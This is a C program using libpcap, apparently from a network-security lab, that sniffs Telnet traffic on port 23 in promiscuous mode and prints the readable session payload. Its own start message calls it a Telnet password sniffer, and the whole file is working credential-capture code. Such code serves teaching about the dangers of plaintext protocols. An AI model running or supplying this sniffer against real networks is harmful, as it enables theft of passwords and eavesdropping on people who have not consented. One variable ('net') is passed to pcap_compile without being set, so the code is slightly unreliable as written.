#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>

#define ETH_HDRLEN 14
#define IP_HDRLEN(ip) ((ip)->ip_hl * 4)
#define TCP_HDRLEN(tcp) ((tcp)->th_off * 4)

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    // 跳过以太网帧头
    struct ip *ip_hdr = (struct ip *)(packet + ETH_HDRLEN);
    int ip_len = IP_HDRLEN(ip_hdr);
    
    // 只处理TCP数据包
    if (ip_hdr->ip_p != IPPROTO_TCP) return;
    
    // 跳过IP头，指向TCP头
    struct tcphdr *tcp_hdr = (struct tcphdr *)((u_char *)ip_hdr + ip_len);
    int tcp_len = TCP_HDRLEN(tcp_hdr);
    
    // 只处理Telnet端口（23）
    if (ntohs(tcp_hdr->th_dport) != 23 && ntohs(tcp_hdr->th_sport) != 23) return;
    
    // 指向TCP数据部分
    u_char *data = (u_char *)tcp_hdr + tcp_len;
    int data_len = ntohs(ip_hdr->ip_len) - ip_len - tcp_len;
    
    if (data_len > 0) {
        char src_ip[INET_ADDRSTRLEN];
        char dst_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip, INET_ADDRSTRLEN);
        
        printf("\n[Telnet数据] %s:%d -> %s:%d\n",
               src_ip, ntohs(tcp_hdr->th_sport),
               dst_ip, ntohs(tcp_hdr->th_dport));
        printf("数据内容: ");
        for (int i = 0; i < data_len; i++) {
            // 只打印可打印字符
            if (data[i] >= 32 && data[i] <= 126) {
                printf("%c", data[i]);
            } else {
                printf(".");
            }
        }
        printf("\n");
    }
}

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    bpf_u_int32 net;

    // TODO: 替换为你的实验网络接口名
    char *dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n",
            errbuf);
        exit(EXIT_FAILURE);
    }

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "无法打开设备 %s: %s\n", dev, errbuf);
        return 1;
    }

    // 过滤Telnet流量（端口23）
    char filter_exp[] = "tcp port 23";
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "过滤器编译失败: %s\n", pcap_geterr(handle));
        return 1;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "设置过滤器失败: %s\n", pcap_geterr(handle));
        return 1;
    }

    printf("Telnet密码嗅探已启动，接口：%s\n", dev);
    printf("将捕获所有Telnet流量（端口23）\n");
    printf("按 Ctrl+C 停止\n");

    pcap_loop(handle, -1, got_packet, NULL);
    pcap_close(handle);
    return 0;
}